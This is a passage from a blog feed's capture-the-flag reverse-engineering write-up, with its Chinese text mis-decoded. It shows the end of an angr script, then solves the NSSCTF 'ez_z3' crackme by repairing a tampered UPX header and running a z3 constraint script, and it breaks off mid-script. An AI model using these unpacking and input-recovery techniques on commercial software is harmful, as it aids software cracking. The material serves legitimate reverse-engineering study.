data-num=\"16\"></td><td><pre>\tsimulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>succ<span class=\"token punctuation\">,</span>avoid<span class=\"token operator\">=</span>fail<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tsolution_state<span class=\"token operator\">=</span>simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tsolution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Solution is &#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\ttest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "ç¬”è®°"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/04/02/%E5%87%A0%E9%81%93RE%E9%A2%98/",
            "url": "https://3cly.github.io/2023/04/02/%E5%87%A0%E9%81%93RE%E9%A2%98/",
            "title": "å‡ é“REé¢˜",
            "date_published": "2023-04-02T11:06:48.000Z",
            "content_html": "<h1 id=\"some_reé¢˜ç›®\"><a class=\"markdownIt-Anchor\" href=\"#some_reé¢˜ç›®\">#</a> some_RE é¢˜ç›®</h1>\n<h2 id=\"ez_z3\"><a class=\"markdownIt-Anchor\" href=\"#ez_z3\">#</a> ez_z3</h2>\n<p>ä¸€é“æ¥è‡ª NSSCTF ä¸¾åŠçš„é€†å‘ä¸“é¢˜æ¯”èµ› round#x çš„é¢˜ç›®</p>\n<p>(NSSCTF å’Œ NKCTF æ—¶é—´é‡å¤äº† ä¸¤è¾¹éƒ½åœ¨çœ‹é¢˜ = =)</p>\n<p><img data-src=\"/images/image-20230331170435294.png\" alt=\"image-20230331170435294\"></p>\n<p>åœ¨ IDA ä¸­çœ‹å¾ˆæ˜æ˜¾çœ‹åˆ°åŠ äº†å£³ ç›´æ¥è„± UPX ä¸è¡Œ é­”æ”¹äº† 010 ä¸­æŸ¥çœ‹å‘ç°å°±æ˜¯æ”¹äº†å­—èŠ‚å¤´çš„åŠ å£³ ç›´æ¥åœ¨ 010 ä¸­æœç´¢ XYU1 æ”¹æˆ UPX! å°±è¡Œäº†</p>\n<p><img data-src=\"/images/image-20230331171858307.png\" alt=\"image-20230331171858307\"></p>\n<p>æˆåŠŸè„±å£³ååœ¨ IDA ä¸­çœ‹åˆ°ä¸»ç¨‹åº 2 æ¬¡è¾“å…¥ å…¶ä¸­åœ¨ç¬¬äºŒä¸ªè¾“å…¥åè¶Šè¿‡å¾ªç¯çœ‹åˆ°ä¸€ä¸ªéœ€è¦ z3 è§£çš„å‡½æ•°</p>\n<p><img data-src=\"/images/image-20230331173707760.png\" alt=\"image-20230331173707760\"></p>\n<p>ç›´æ¥è§£å°±è¡Œäº†</p>\n<p>ä¸Šè„šæœ¬</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'x%d'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">127</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># æ·»åŠ çº¦æŸæ¡ä»¶â‘ å› ä¸ºè¾“å…¥çš„è‚¯å®šæ˜¯å¯è§å­—ç¬¦</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2582239</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token punctuation\">(</span><span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>       <span class=\"token operator\">+</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">2602741</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2668123</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span><span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token punctuation\">(</span><span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>     <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>     <span class=\"token operator\">+</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>     <span class=\"token operator\">-</span> <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">2520193</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>    <span class=\"token number\">18</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">17</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">17</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">16</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">15</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">14</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">12</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">11</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">9</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">7</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">7</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">16</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>    <span class=\"token operator\">-</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span 